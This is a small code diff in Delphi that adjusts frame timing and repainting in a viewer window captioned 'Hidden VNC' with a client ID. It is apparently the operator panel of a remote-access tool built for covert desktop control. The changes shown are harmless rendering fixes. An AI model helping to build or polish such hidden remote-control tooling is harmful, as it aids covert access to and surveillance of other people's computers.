@@ -177,7 +177,7 @@ begin
   begin
     FFrameTimer          := TTimer.Create(Self);
     FFrameTimer.Enabled  := False;
-    FFrameTimer.Interval := 33;
+    FFrameTimer.Interval := 30; // ~33 FPS
     FFrameTimer.OnTimer  := FrameTimerTimer;
   end;
 
@@ -207,6 +207,8 @@ begin
 
     if FPaintBox.Parent is TWinControl then
       TWinControl(FPaintBox.Parent).DoubleBuffered := True;
+
+    FPaintBox.BringToFront;
   end;
 
   Caption        := 'Hidden VNC - ' + FClientID;
@@ -426,7 +428,7 @@ begin
   FDisplayBitmap.Canvas.Draw(0, 0, ABitmap);
 
   if Assigned(FPaintBox) then
-    FPaintBox.Canvas.StretchDraw(FPaintBox.ClientRect, ABitmap);
+    FPaintBox.Invalidate; // Trigger OnPaint which uses StretchDraw
 
   FLastFrameSize := AFrameSize;
   if (GetTickCount64 - FLastStatusTick) >= 500 then
